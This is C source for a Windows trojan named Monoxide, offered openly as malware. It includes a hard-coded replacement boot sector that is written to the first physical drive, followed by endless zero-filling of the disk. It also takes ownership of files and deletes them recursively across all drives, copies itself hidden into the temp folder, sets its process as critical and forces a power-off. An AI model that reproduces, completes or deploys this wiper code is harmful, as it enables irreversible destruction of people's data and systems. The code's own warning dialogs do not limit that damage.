#include "monoxide.h"

const CHAR pccMbrData[ 512 ] = {
	0x31, 0xC0, 0x8E, 0xD8, 0x8E, 0xC0, 0x8E, 0xE0, 0x8E, 0xE8, 0x8E, 0xD0, 0x66, 0xBC, 0x00, 0x7C,
	0x00, 0x00, 0x66, 0x89, 0xE5, 0xEA, 0x1A, 0x7C, 0x00, 0x00, 0x30, 0xE4, 0xB0, 0x13, 0xCD, 0x10,
	0x0F, 0x31, 0xA3, 0xA9, 0x7C, 0xE8, 0x24, 0x00, 0xB8, 0x00, 0xA0, 0x8E, 0xC0, 0xBF, 0xFF, 0xF9,
	0xB1, 0x20, 0xEB, 0x44, 0x89, 0xD8, 0xC1, 0xE0, 0x07, 0x31, 0xC3, 0x89, 0xD8, 0xC1, 0xE8, 0x09,
	0x31, 0xC3, 0x89, 0xD8, 0xC1, 0xE0, 0x08, 0x31, 0xC3, 0x89, 0xD8, 0xC3, 0xB4, 0x02, 0x30, 0xFF,
	0x30, 0xD2, 0xCD, 0x10, 0xBE, 0xAB, 0x7C, 0xAC, 0x08, 0xC0, 0x74, 0x15, 0x50, 0x8B, 0x1E, 0xA9,
	0x7C, 0xE8, 0xD0, 0xFF, 0x31, 0x06, 0xA9, 0x7C, 0x88, 0xC3, 0x58, 0xB4, 0x0E, 0xCD, 0x10, 0xEB,
	0xE6, 0xFE, 0xC6, 0x74, 0x02, 0xEB, 0xD5, 0xC3, 0x8B, 0x1E, 0xA9, 0x7C, 0xE8, 0xB5, 0xFF, 0x31,
	0x06, 0xA9, 0x7C, 0x31, 0xD2, 0xBB, 0x03, 0x00, 0xF7, 0xF3, 0x89, 0xD0, 0x00, 0xC8, 0x26, 0x88,
	0x05, 0x4F, 0x83, 0xFF, 0xFF, 0x75, 0xE1, 0xBF, 0xFF, 0xF9, 0x80, 0xF9, 0x33, 0x7F, 0x04, 0xFE,
	0xC1, 0xEB, 0xD5, 0xFE, 0xC5, 0xB1, 0x20, 0xEB, 0xCF, 0x00, 0x10, 0x54, 0x68, 0x69, 0x73, 0x20,
	0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x20, 0x68, 0x61, 0x73, 0x20, 0x62, 0x65, 0x65, 0x6E, 0x20,
	0x64, 0x65, 0x6C, 0x65, 0x74, 0x65, 0x64, 0x20, 0x62, 0x79, 0x20, 0x4D, 0x6F, 0x6E, 0x6F, 0x78,
	0x69, 0x64, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};

BOOL
WINAPI
ExecuteDropper( VOID )
{
	WCHAR szPath[ MAX_PATH ] = { 0 };
	WCHAR szNewPath[ MAX_PATH ] = { 0 };
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi;
	DWORD dwUnnamed;
	HANDLE hFile;

	GetModuleFileNameW( NULL, szPath, MAX_PATH );
start:
	GetTempPathW( MAX_PATH, szNewPath );

	if ( wcsncmp( szPath, szNewPath, wcslen( szNewPath ) ) )
	{
		WCHAR szFileName[ 17 ] = { 0 };
		GetRandomPath( szFileName, 16 );
		wcscat_s( szNewPath, MAX_PATH, szFileName );
		wcscat_s( szNewPath, MAX_PATH, L".txt" );

		if ( ( hFile = CreateFileW( szNewPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL ) ) == INVALID_HANDLE_VALUE )
		{
			RtlZeroMemory( szNewPath, MAX_PATH );
			goto start;
		}

		while ( !WriteFile( hFile, szPath, MAX_PATH, &dwUnnamed, NULL ) )
		{
			Sleep( 10 );
		}

		CloseHandle( hFile );

		GetTempPathW( MAX_PATH, szNewPath );
		wcscat_s( szNewPath, MAX_PATH, szFileName );
		wcscat_s( szNewPath, MAX_PATH, L".exe" );

		while ( !CopyFileW( szPath, szNewPath, FALSE ) )
		{
			Sleep( 10 );
		}

		while ( !SetFileAttributesW( szNewPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM ) )
		{
			Sleep( 10 );
		}

		si.cb = sizeof( si );
		CreateProcessW( szNewPath, NULL, NULL, NULL, FALSE, DETACHED_PROCESS, NULL, NULL, &si, &pi );
		CloseHandle( pi.hProcess );
		CloseHandle( pi.hThread );

		return FALSE;
	}
	else
	{
		*wcsrchr( szPath, L'.' ) = 0;
		wcscat_s( szPath, MAX_PATH, L".txt" );

		while ( ( hFile = CreateFileW( szPath, GENERIC_READ, 0, NULL, OPEN_ALWAYS, 0, NULL ) ) == INVALID_HANDLE_VALUE )
		{
			Sleep( 10 );
		}

		while ( !ReadFile( hFile, szNewPath, MAX_PATH, &dwUnnamed, NULL ) )
		{
			Sleep( 10 );
		}

		CloseHandle( hFile );

		while ( !DeleteFileW( szPath ) )
		{
			Sleep( 10 );
		}
		
		while ( !DeleteFileW( szNewPath ) )
		{
			Sleep( 10 );
		}

		if ( MessageBoxW( NULL, L"WARNING!\n\nYou have ran a Trojan known as Monoxide.exe that has full capacity to delete all of your data and your operating system.\n\nBy continuing, you keep in mind that the creator will not be responsible for any damage caused by this trojan and it is highly recommended that you run this in a testing virtual machine where a snapshot has been made before execution for the sake of entertainment and analysis.\n\nAre you sure you want to run this?", L"Malware alert - Monoxide.exe", MB_ICONWARNING | MB_YESNO ) != IDYES )
			return FALSE;
		if ( MessageBoxW( NULL, L"FINAL WARNING!!!\n\nThis Trojan has a lot of destructive potential. You will lose all of your data if you continue, and the creator will not be responsible for any of the damage caused. This is not meant to be malicious but simply for entertainment and educational purposes.\n\nAre you sure you want to continue? This is your final chance to stop this program from execution.", L"Malware alert - Monoxide.exe", MB_ICONWARNING | MB_YESNO ) != IDYES )
			return FALSE;
	}

	return TRUE;
}

BOOL
WINAPI
SetPrivilege(
	_In_ HANDLE hToken,
	_In_ PCWSTR szPrivilege,
	_In_ BOOL bEnablePrivilege
)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if ( !LookupPrivilegeValueW( NULL, szPrivilege, &luid ) )
	{
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[ 0 ].Luid = luid;
	if ( bEnablePrivilege )
		tp.Privileges[ 0 ].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[ 0 ].Attributes = 0;

	if ( !AdjustTokenPrivileges( hToken, FALSE, &tp, sizeof( TOKEN_PRIVILEGES ), ( PTOKEN_PRIVILEGES )NULL, ( PDWORD )NULL ) )
	{
		return FALSE;
	}

	if ( GetLastError( ) == ERROR_NOT_ALL_ASSIGNED )
	{
		return FALSE;
	}

	return TRUE;
}

BOOL
WINAPI
TakeOwnership(
	_In_ PWSTR szFile
)
{
	BOOL bRetval = FALSE;
	HANDLE hToken = NULL;
	PSID pSIDAdmin = NULL, pSIDEveryone = NULL;
	PACL pACL = NULL;
	SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY, SIDAuthNT = SECURITY_NT_AUTHORITY;
	EXPLICIT_ACCESS ea[ NUM_ACES ] = { 0 };
	DWORD dwRes;

	if ( !AllocateAndInitializeSid( &SIDAuthWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &pSIDEveryone ) )
	{
		goto cleanup;
	}

	if ( !AllocateAndInitializeSid( &SIDAuthNT, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pSIDAdmin ) )
	{
		goto cleanup;
	}

	ea[ 0 ].grfAccessPermissions = GENERIC_ALL;
	ea[ 0 ].grfAccessMode = SET_ACCESS;
	ea[ 0 ].grfInheritance = NO_INHERITANCE;
	ea[ 0 ].Trustee.TrusteeForm = TRUSTEE_IS_SID;
	ea[ 0 ].Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
	ea[ 0 ].Trustee.ptstrName = ( PWSTR )pSIDEveryone;

	ea[ 1 ].grfAccessPermissions = GENERIC_ALL;
	ea[ 1 ].grfAccessMode = SET_ACCESS;
	ea[ 1 ].grfInheritance = NO_INHERITANCE;
	ea[ 1 ].Trustee.TrusteeForm = TRUSTEE_IS_SID;
	ea[ 1 ].Trustee.TrusteeType = TRUSTEE_IS_GROUP;
	ea[ 1 ].Trustee.ptstrName = ( PWSTR )pSIDAdmin;

	if ( SetEntriesInAclW( NUM_ACES, ea, NULL, &pACL ) != ERROR_SUCCESS )
	{
		goto cleanup;
	}

	dwRes = SetNamedSecurityInfoW( szFile, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pACL, NULL );

	if ( dwRes == ERROR_SUCCESS )
	{
		bRetval = TRUE;
		goto cleanup;
	}

	if ( dwRes != ERROR_ACCESS_DENIED )
	{
		goto cleanup;
	}

	if ( !OpenProcessToken( GetCurrentProcess( ), TOKEN_ADJUST_PRIVILEGES, &hToken ) )
	{
		goto cleanup;
	}

	if ( !SetPrivilege( hToken, SE_TAKE_OWNERSHIP_NAME, TRUE ) )
	{
		goto cleanup;
	}

	dwRes = SetNamedSecurityInfoW( szFile, SE_FILE_OBJECT, OWNER_SECURITY_INFORMATION, pSIDAdmin, NULL, NULL, NULL );

	if ( dwRes != ERROR_SUCCESS )
	{
		goto cleanup;
	}

	if ( !SetPrivilege( hToken, SE_TAKE_OWNERSHIP_NAME, FALSE ) )
	{
		goto cleanup;
	}

	dwRes = SetNamedSecurityInfoW( szFile, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pACL, NULL ); 

	if ( dwRes == ERROR_SUCCESS )
	{
		bRetval = TRUE;
	}

cleanup:
	if ( pSIDAdmin ) FreeSid( pSIDAdmin );
	if ( pSIDEveryone ) FreeSid( pSIDEveryone );
	if ( pACL ) LocalFree( pACL );
	if ( hToken ) CloseHandle( hToken );

	return bRetval;
}

VOID
WINAPI
DriveMess( VOID )
{
	WCHAR szTempDrives[ 512 ] = { 0 };
	DWORD dwLength = GetLogicalDriveStringsW( 512, szTempDrives );

	CloseHandle( CreateThread( NULL, 0, ( PTHREAD_START_ROUTINE )FileMess, szTempDrives, 0, NULL ) );
	for ( DWORD i = 0; i < dwLength; i++ )
	{
		if ( !szTempDrives[ i ] )
		{
			CloseHandle( CreateThread( NULL, 0, ( PTHREAD_START_ROUTINE )FileMess, szTempDrives + ( i + 1 ) * sizeof( WCHAR ), 0, NULL ) );
		}
	}
}

BOOL
WINAPI
FileMess(
	_In_ PWSTR szDirectory
)
{
	TakeOwnership( szDirectory );

	WCHAR szSearchDir[ MAX_PATH ] = { 0 };
	lstrcpyW( szSearchDir, szDirectory );
	lstrcatW( szSearchDir, L"*.*" );

	WIN32_FIND_DATA findData;
	HANDLE hSearch = FindFirstFileW( szSearchDir, &findData );

	if ( hSearch == INVALID_HANDLE_VALUE )
		return FALSE;
	else do
	{
		if ( !lstrcmpW( findData.cFileName, L"." ) || !lstrcmpW( findData.cFileName, L".." ) ||
			findData.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT )
		{
			continue;
		}

		WCHAR szPath[ MAX_PATH ] = { 0 };
		lstrcpyW( szPath, szDirectory );
		lstrcatW( szPath, findData.cFileName );

		TakeOwnership( szPath );

		if ( findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY )
		{
			lstrcatW( szPath, L"\\" );
			FileMess( szPath );
			RemoveDirectoryW( szPath );
		}
		else
		{
			if ( Xorshift32( ) % 24 )
			{
				DeleteFileW( szPath );
			}
			else
			{
				ShellExecuteW( NULL, L"open", szPath, NULL, szDirectory, SW_SHOW );
			}
		}
	}
	while ( FindNextFileW( hSearch, &findData ) );

	FindClose( hSearch );
	RemoveDirectoryW( szDirectory );

	return TRUE;
}

BOOL
WINAPI
OverwriteBoot( VOID )
{
	HANDLE hDrive;
	DWORD dwWrittenBytes;
	BOOL bSuccess;

	hDrive = CreateFileW( L"\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL );
	
	if ( hDrive == INVALID_HANDLE_VALUE )
	{
		MessageBoxW( NULL, L"I failed to infect your computer and I am a failure.\n...\nI hope you don't mind.\n(God, this is so embarrassing...)", L"Monoxide.exe", MB_OK | MB_ICONERROR );
		return FALSE;
	}

	bSuccess = WriteFile( hDrive, pccMbrData, 512, &dwWrittenBytes, NULL );

	if ( !bSuccess )
	{
		MessageBoxW( NULL, L"Uhm... Why can't I overwrite your bootloader?\nOkay, well, I guess I can die now.", L"Monoxide.exe", MB_OK | MB_ICONERROR );
		CloseHandle( hDrive );

		return FALSE;
	}

	CHAR pcNullData[ 512 ];
	RtlZeroMemory( pcNullData, 512 );

	for ( ;; WriteFile( hDrive, pcNullData, 512, &dwWrittenBytes, NULL ) );
}

BOOL
WINAPI
ForceShutdownComputer( VOID )
{
	NTSTATUS( NTAPI * RtlAdjustPrivilege )( ULONG ulPrivilege, BOOLEAN bEnable, BOOLEAN bCurrentThread, PBOOLEAN pbEnabled );
	NTSTATUS( NTAPI * NtShutdownSystem )( _In_ SHUTDOWN_ACTION Action );
	NTSTATUS( NTAPI * NtSetSystemPowerState )( _In_ POWER_ACTION SystemAction, _In_ SYSTEM_POWER_STATE MinSystemState, _In_ ULONG Flags );
	NTSTATUS ntReturnValue;
	HMODULE hNtDll;
	BOOLEAN bUnused;
	BOOL bSuccess;

	hNtDll = LoadLibraryW( L"ntdll.dll" );
	RtlAdjustPrivilege = ( PVOID )GetProcAddress( hNtDll, "RtlAdjustPrivilege" );
	NtSetSystemPowerState = ( PVOID )GetProcAddress( hNtDll, "NtSetSystemPowerState" );
	NtShutdownSystem = ( PVOID )GetProcAddress( hNtDll, "NtShutdownSystem" );

	if ( RtlAdjustPrivilege )
	{
		ntReturnValue = RtlAdjustPrivilege( 19 /* SeShutdownPrivilege */, TRUE, FALSE, &bUnused );

		if ( ntReturnValue )
		{
			MessageBoxW( NULL, L"I'm not allowed to adjust my debug privilege, somehow.\nYou're doing something here, aren't you?!", L"Monoxide.exe", MB_OK | MB_ICONERROR );
			return FALSE;
		}
	}

	if ( NtSetSystemPowerState )
	{
		ntReturnValue = NtSetSystemPowerState( PowerActionShutdownOff, PowerSystemShutdown,
			SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_POWER_SUPPLY );

		if ( !ntReturnValue )
		{
			return TRUE;
		}
	}

	if ( NtShutdownSystem )
	{
		ntReturnValue = NtShutdownSystem( ShutdownPowerOff );

		if ( !ntReturnValue )
		{
			return TRUE;
		}
	}

	bSuccess = ExitWindowsEx( EWX_POWEROFF, EWX_FORCE );

	if ( !bSuccess )
	{
		MessageBoxW( NULL, L"I can't power off the computer.\nYou're lucky this time...", L"Monoxide.exe", MB_OK | MB_ICONERROR );

		return FALSE;
	}

	return TRUE;
}

BOOL
WINAPI
SetProcessCritical( VOID )
{
	NTSTATUS( NTAPI * RtlAdjustPrivilege )( ULONG ulPrivilege, BOOLEAN bEnable, BOOLEAN bCurrentThread, PBOOLEAN pbEnabled );
	NTSTATUS( NTAPI * RtlSetProcessIsCritical )( BOOLEAN bNew, PBOOLEAN pbOld, BOOLEAN bNeedScb );
	NTSTATUS ntReturnValue;
	ULONG ulBreakOnTermination;
	BOOLEAN bUnused;
	HMODULE hNtDll;

	hNtDll = LoadLibraryW( L"ntdll.dll" );
	RtlAdjustPrivilege = ( PVOID )GetProcAddress( hNtDll, "RtlAdjustPrivilege" );
	RtlSetProcessIsCritical = ( PVOID )GetProcAddress( hNtDll, "RtlSetProcessIsCritical" );
	
	if ( RtlAdjustPrivilege )
	{
		ntReturnValue = RtlAdjustPrivilege( 20 /* SeDebugPrivilege */, TRUE, FALSE, &bUnused );

		if ( ntReturnValue )
		{
			MessageBoxW( NULL, L"I can't adjust my debug privileges... somehow.", L"Monoxide.exe", MB_OK | MB_ICONERROR );

			return FALSE;
		}
	}
	else
	{
		MessageBoxW( NULL, L"Nope, can't find RtlAdjustPrivilege... What the hell is this?", L"Monoxide.exe", MB_OK | MB_ICONERROR );

		return FALSE;
	}

	if ( RtlSetProcessIsCritical )
	{
		ulBreakOnTermination = 1;
		ntReturnValue = RtlSetProcessIsCritical( TRUE, NULL, FALSE );

		if ( ntReturnValue )
		{
			MessageBoxW( NULL, L"Uhm... It's not letting me be a critical process... This isn't right!", L"Monoxide.exe", MB_OK | MB_ICONERROR );

			return FALSE;
		}
	}
	else
	{
		MessageBoxW( NULL, L"Please help me out, I can't find RtlSetProcessIsCritical. Do you know where it is?", L"Monoxide.exe", MB_OK | MB_ICONERROR );

		return FALSE;
	}

	return TRUE;
}
